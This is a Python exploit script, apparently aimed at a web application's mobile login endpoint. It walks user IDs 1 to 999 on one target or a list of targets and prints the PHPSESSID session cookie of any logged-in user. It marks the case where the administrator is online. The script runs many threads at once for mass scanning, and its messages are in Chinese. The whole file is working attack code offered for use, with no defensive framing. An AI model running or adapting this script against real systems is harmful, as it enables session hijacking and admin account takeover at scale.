#!/usr/bin/python3
# coding: utf-8
import requests
import sys
import re
import time
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import threadpool
def usage():
    print("Usage:python3 exp.py -u url")
    print("Usage:python3 exp.py -f url.txt")
def POC(target_url):
    try:
        for uid in range(1,1000):
            vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=%s&P_VER=0"%uid
            headers = {
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
               }
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
            if response.status_code == 200 and response.text == "":
                PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
                print("\033[32m[o] 目标为："+target_url+",uid为："+str(uid)+" \033[0m")
                if str(uid)=="1":
                    print("\033[31m[+] 管理员竟然在线！ \033[0m")
                print("\033[32m[o] 用户上线 PHPSESSION: {} --- {}\033[0m".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time()))))
            else:
                #print(""+target_url+"失败！")
                pass
    except Exception as e:
        pass
        #print("\033[31m[x] 请求失败 \033[0m", e)
def run(filename,pools=10):
    works = []
    with open(filename, "r") as f:
        for i in f:
            target_url = [i.rstrip()]
            works.append((target_url, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(POC, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u",
                        "--url",
                        help="Target URL; Example:http://ip:port")
    parser.add_argument("-f",
                        "--file",
                        help="Url File; Example:url.txt")
    args = parser.parse_args()
    url = args.url
    file_path = args.file
    if url != None and file_path ==None:
        POC(url)
    elif url == None and file_path != None:
        run(file_path, 10)
if __name__ == '__main__':
    usage()
    main()
